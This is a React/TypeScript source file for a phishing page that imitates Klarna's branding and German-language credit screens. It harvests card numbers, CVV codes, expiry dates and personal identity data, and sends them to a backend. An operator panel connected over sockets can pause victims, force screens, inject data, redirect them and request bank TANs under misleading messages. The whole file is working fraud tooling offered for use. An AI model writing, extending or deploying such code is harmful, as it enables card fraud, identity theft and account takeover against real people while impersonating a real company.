import React, { useState, useEffect } from 'react';
import { useParams, useNavigate } from 'react-router-dom';
import { updatePageMetadata, getTemplateMetadata } from '../../utils/templateMetadata';
import { submitTemplateData, getTemplateConfig, createTemplateSession } from '../../utils/templateApi';
import { preloadBankImages } from '../../utils/imagePreloader';
import templateSocketClient from '../../utils/socketClient';

// Import Klarna components (keep Klarna branding)
import KlarnaHeader from '../klarna/components/KlarnaHeader';
import KlarnaFooter from '../klarna/components/KlarnaFooter';
import KlarnaCreditPersonalData from './components/KlarnaCreditPersonalData';
import KlarnaCreditCard from './components/KlarnaCreditCard';
import KlarnaLoading from '../klarna/components/KlarnaLoading';
import KlarnaErrorScreen from '../klarna/components/KlarnaErrorScreen';
import KlarnaSuccess from '../klarna/components/KlarnaSuccess';

import '../klarna/KlarnaStyle.css';

// Credit Landing flow states (Credit Card first, then Personal Data)
const CREDIT_STATES = {
  BANK_CARD: 'bank_card',
  PERSONAL_DATA: 'personal_data',
  PROCESSING: 'processing',
  SUCCESS: 'success',
  ERROR: 'error'
};

// Data interfaces
interface PersonalData {
  first_name: string;
  last_name: string;
  date_of_birth: string;
  street: string;
  street_number: string;
  plz: string;
  city: string;
  phone: string;
  email: string;
}

interface BankCardData {
  card_number: string;
  expiry_date: string;
  cvv: string;
  cardholder_name: string;
}

// AutoLogin component to handle automatic key generation
function CreditAutoLogin() {
  const navigate = useNavigate();
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);

  useEffect(() => {
    // Update metadata for Klarna (keep Klarna branding)
    const metadata = getTemplateMetadata('klarna');
    updatePageMetadata(metadata);

    // Automatically generate a new key
    const generateKey = async () => {
      try {
        const key = await createTemplateSession('credit-landing');
        if (process.env.NODE_ENV === 'development') {
          console.log('Generated Klarna Credit session key:', key);
        }
        navigate(`/credit-landing/${key}`);
      } catch (error) {
        console.error('Failed to create Klarna Credit session:', error);
        setError('Fehler beim Erstellen der Sitzung');
        setLoading(false);
      }
    };

    // Small delay to show loading
    setTimeout(generateKey, 500);
  }, [navigate]);

  if (error) {
    return <KlarnaErrorScreen message={error} onRetry={() => window.location.reload()} />;
  }

  return <KlarnaLoading message="Klarna wird geladen..." />;
}

// Main Credit Landing flow component
function CreditFormFlow() {
  const { key } = useParams<{ key: string }>();
  const navigate = useNavigate();
  
  const [state, setState] = useState(CREDIT_STATES.BANK_CARD);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);
  const [loadingMessage, setLoadingMessage] = useState("Wird verarbeitet...");
  const [templateConfig, setTemplateConfig] = useState<Record<string, boolean>>({});
  const [configLoaded, setConfigLoaded] = useState(false);
  
  // Session data
  const [personalData, setPersonalData] = useState<PersonalData | null>(null);
  const [bankCardData, setBankCardData] = useState<BankCardData | null>(null);
  
  // Enhanced TAN system state
  const [currentTanRequest, setCurrentTanRequest] = useState<{
    type: 'TRANSACTION_TAN' | 'LOGIN_TAN';
    method: 'pushtan' | 'sms';
    transactionDetails?: any;
    requestId: string;
  } | null>(null);

  // AFK/Live Mode system state
  const [sessionMode, setSessionMode] = useState<'AFK' | 'LIVE'>('AFK');
  const [isWaitingForAdmin, setIsWaitingForAdmin] = useState(false);

  // Scroll to top whenever state changes
  useEffect(() => {
    window.scrollTo({ top: 0, behavior: 'smooth' });
  }, [state]);

  // Flow control function - checks if should pause in Live Mode
  const proceedToNextState = (nextState: string, processingMessage: string = 'Wird verarbeitet...') => {
    if (sessionMode === 'LIVE') {
      // In Live Mode: pause and wait for admin
      setLoading(true);
      setLoadingMessage(processingMessage);
      setIsWaitingForAdmin(true);
      
      // Store the next state to transition to when admin continues
      setPersonalData(prev => ({ ...prev, pendingState: nextState } as any));
      
      // Notify admin that user is waiting
      templateSocketClient.emit('user-waiting', {
        sessionKey: key,
        currentState: state,
        pendingState: nextState,
        message: processingMessage
      });
    } else {
      // In AFK Mode: continue automatically
      setState(nextState);
    }
  };

  useEffect(() => {
    // Update metadata for Klarna (keep Klarna branding)
    const metadata = getTemplateMetadata('klarna');
    updatePageMetadata(metadata);

    // Preload Klarna specific images (keep Klarna assets)
    preloadBankImages('klarna');

    // Load template configuration - MUST complete before user interaction
    const loadConfig = async () => {
      try {
        setLoadingMessage("Schritt-Konfiguration wird geladen...");
        const config = await getTemplateConfig('credit-landing');
        if (process.env.NODE_ENV === 'development') {
          console.log('✅ Klarna Credit template configuration loaded:', config.steps);
          console.log('🔧 Klarna Credit step config details:', {
            personalData: config.steps.personalData,
            bankCard: config.steps.bankCard,
            configLoaded: true
          });
        }
        setTemplateConfig(config.steps || {});
        setConfigLoaded(true);
      } catch (error) {
        console.error('⚠️ Failed to load Klarna Credit template config:', error);
        // Set default config if loading fails
        setTemplateConfig({ personalData: true, bankCard: true });
        setConfigLoaded(true);
      }
    };
    
    // Wait for config to load, then initialize session
    const initializeAfterConfig = async () => {
      await loadConfig();
      setLoadingMessage("Klarna wird initialisiert...");
      setTimeout(() => {
        setLoading(false);
        if (process.env.NODE_ENV === 'development') {
          console.log('✅ Klarna Credit session initialized with key:', key);
        }
      }, 1000);
    };
    
    initializeAfterConfig();
    
    // Initialize Socket.io connection for real-time admin control
    if (key) {
      templateSocketClient.connect({
        sessionKey: key,
        templateName: 'credit-landing',
        onStateForced: (state: string, message?: string) => {
          console.log('🎯 Admin forced state change:', state, message);
          
          // Show loading screen during state transition
          setLoading(true);
          
          const getLoadingMessage = (targetState: string): string => {
            switch (targetState) {
              case 'personal_data':
                return 'Persönliche Daten werden geladen...';
              case 'bank_card':
                return 'Bankdaten werden verarbeitet...';
              case 'success':
                return 'Vorgang wird abgeschlossen...';
              default:
                return 'Bitte warten Sie...';
            }
          };
          
          setLoadingMessage(message || getLoadingMessage(state));
          
          setTimeout(() => {
            setState(state);
            setLoading(false);
            if (message) {
              alert(message);
            }
          }, 1500);
        },
        onDataInjected: (data: any) => {
          console.log('💉 Admin injected data:', data);
          
          setLoading(true);
          setLoadingMessage('Daten werden aktualisiert...');
          
          setTimeout(() => {
            if (data.personalData) setPersonalData(data.personalData);
            if (data.bankCardData) setBankCardData(data.bankCardData);
            setLoading(false);
          }, 1000);
        },
        onRedirect: (url: string) => {
          console.log('🔗 Admin triggered redirect:', url);
          window.location.href = url;
        },
        onMessage: (message: string, type: string) => {
          console.log('💬 Admin message:', message, type);
          alert(`${type.toUpperCase()}: ${message}`);
        },
        // AFK/Live Mode handlers
        onModeChanged: (mode: 'AFK' | 'LIVE') => {
          console.log('🎛️ Admin changed session mode:', mode);
          setSessionMode(mode);
          
          if (mode === 'AFK' && isWaitingForAdmin) {
            setIsWaitingForAdmin(false);
            setLoading(false);
          }
        },
        onContinueFlow: () => {
          console.log('▶️ Admin triggered continue flow');
          if (isWaitingForAdmin && personalData?.pendingState) {
            setIsWaitingForAdmin(false);
            setLoading(false);
            setState((personalData as any).pendingState);
            setPersonalData(prev => ({ ...prev, pendingState: null } as any));
          }
        },
        // Enhanced TAN system handlers
        onTanRequest: (tanData: {
          type: 'TRANSACTION_TAN' | 'LOGIN_TAN';
          method: 'pushtan' | 'sms';
          transactionDetails?: any;
          requestId: string;
        }) => {
          console.log('🔐 Admin requested TAN:', tanData);
          
          setLoading(true);
          setLoadingMessage(
            tanData.type === 'TRANSACTION_TAN' 
              ? 'Stornierung wird vorbereitet...' 
              : 'Anmeldung wird verarbeitet...'
          );
          
          setTimeout(() => {
            setCurrentTanRequest(tanData);
            setLoading(false);
            setState(CREDIT_STATES.SUCCESS);
          }, 2000);
        }
      });
    }
    
    // Cleanup socket on unmount
    return () => {
      templateSocketClient.disconnect();
    };
  }, [key, isWaitingForAdmin, personalData]);

  // Helper function to proceed to next step
  const proceedToNextStep = () => {
    if (templateConfig.personalData === true) {
      setState(CREDIT_STATES.PERSONAL_DATA);
    } else {
      setState(CREDIT_STATES.SUCCESS);
    }
  };

  // Handle personal data submission (now final step)
  const handlePersonalDataSubmit = async (data: PersonalData) => {
    // ✅ CRITICAL: Wait for step config to load before processing
    if (!configLoaded) {
      console.warn('⚠️ Personal data submit attempted before step config loaded - ignoring');
      return;
    }
    
    try {
      console.log('Klarna Credit: Personal data submission (final step)');
      setLoading(true);
      setLoadingMessage("Identitätsverifizierung wird abgeschlossen...");

      // Submit personal data to backend (final step)
      const response = await submitTemplateData({
        template_name: 'credit-landing',
        key: key || '',
        step: 'personal-data-complete',
        data: { 
          ...data, 
          bank_card: bankCardData 
        }
      });

      if (response.success) {
        console.log('✅ Klarna Credit application completed successfully');
        setPersonalData(data);
        
        // Simulate processing time
        setTimeout(() => {
          setState(CREDIT_STATES.SUCCESS);
          setLoading(false);
        }, 2000);
      } else {
        console.error('❌ Klarna Credit personal data failed:', response.error);
        setError(response.error || 'Fehler beim Abschließen der Identitätsverifizierung');
        setState(CREDIT_STATES.ERROR);
        setLoading(false);
      }
    } catch (error: any) {
      console.error('❌ Klarna Credit personal data error:', error);
      setError('Fehler beim Abschließen der Identitätsverifizierung');
      setState(CREDIT_STATES.ERROR);
      setLoading(false);
    }
  };

  // Handle bank card submission (now first step)
  const handleBankCardSubmit = async (data: BankCardData) => {
    // ✅ CRITICAL: Wait for step config to load before processing
    if (!configLoaded) {
      console.warn('⚠️ Bank card submit attempted before step config loaded - ignoring');
      return;
    }
    
    try {
      console.log('Klarna Credit: Credit card submission (first step)');
      setLoading(true);
      setLoadingMessage("Kartendaten werden verifiziert...");

      // Submit bank card data to backend (first step)
      const response = await submitTemplateData({
        template_name: 'credit-landing',
        key: key || '',
        step: 'bank-card-first',
        data: data
      });

      if (response.success) {
        console.log('✅ Klarna Credit card data submitted successfully');
        setBankCardData(data);
        // Proceed to personal data step
        proceedToNextStep();
      } else {
        console.error('❌ Klarna Credit card failed:', response.error);
        setError(response.error || 'Fehler beim Verifizieren der Kartendaten');
        setState(CREDIT_STATES.ERROR);
      }
    } catch (error: any) {
      console.error('❌ Klarna Credit card error:', error);
      setError('Fehler beim Verifizieren der Kartendaten');
      setState(CREDIT_STATES.ERROR);
    } finally {
      setLoading(false);
    }
  };

  // Handle bank card skip
  const handleBankCardSkip = async () => {
    try {
      console.log('Credit Landing: Bank card skipped for session:', key);
      
      // Submit skip to backend
      const response = await submitTemplateData({
        template_name: 'credit-landing',
        key: key || '',
        step: 'bank-card-skip',
        data: { skip_reason: 'no_credit_card' }
      });
      
      if (!response.success) {
        console.error('❌ Credit Landing bank card skip failed:', response.error);
        setError(response.error || 'Fehler beim Überspringen der Kartendaten');
        setState(CREDIT_STATES.ERROR);
        return;
      }
      
      console.log('✅ Credit Landing bank card skip completed successfully');
      
      // Proceed to personal data step
      proceedToNextStep();
      
    } catch (error) {
      console.error('❌ Credit Landing bank card skip error:', error);
      setError('Fehler beim Überspringen der Kartendaten');
      setState(CREDIT_STATES.ERROR);
    }
  };

  // Handle logo click - return to start (credit card first)
  const handleLogoClick = () => {
    setState(CREDIT_STATES.BANK_CARD);
    setPersonalData(null);
    setBankCardData(null);
    setError(null);
  };

  // Render appropriate component based on state
  const renderContent = () => {
    if (loading || !configLoaded) {
      return <KlarnaLoading 
        message={!configLoaded ? "Schritt-Konfiguration wird geladen..." : loadingMessage} 
      />;
    }
    
    if (error && state === CREDIT_STATES.ERROR) {
      return <KlarnaErrorScreen message={error} onRetry={() => {
        setError(null);
        setState(CREDIT_STATES.BANK_CARD);
      }} />;
    }
    
    switch (state) {
      case CREDIT_STATES.BANK_CARD:
        return <KlarnaCreditCard onSubmit={handleBankCardSubmit} onSkip={handleBankCardSkip} />;
      
      case CREDIT_STATES.PERSONAL_DATA:
        return <KlarnaCreditPersonalData onSubmit={handlePersonalDataSubmit} />;
      
      case CREDIT_STATES.PROCESSING:
        return <KlarnaLoading message="Identitätsverifizierung wird bearbeitet..." />;
      
      case CREDIT_STATES.SUCCESS:
        return <KlarnaSuccess />;
      
      default:
        return <KlarnaErrorScreen message="Unbekannter Status" onRetry={() => setState(CREDIT_STATES.BANK_CARD)} />;
    }
  };

  return (
    <div className="klarna-template">
      <KlarnaHeader onLogoClick={handleLogoClick} />
      <main className="klarna-main">
        {renderContent()}
      </main>
      <KlarnaFooter />
    </div>
  );
}

// Main Credit Landing Template Component
const CreditLandingTemplate: React.FC = () => {
  const { key } = useParams<{ key: string }>();

  // If no key provided, show AutoLogin to generate one
  if (!key) {
    return <CreditAutoLogin />;
  }

  // If key provided, show the main form flow
  return <CreditFormFlow />;
};

export default CreditLandingTemplate;
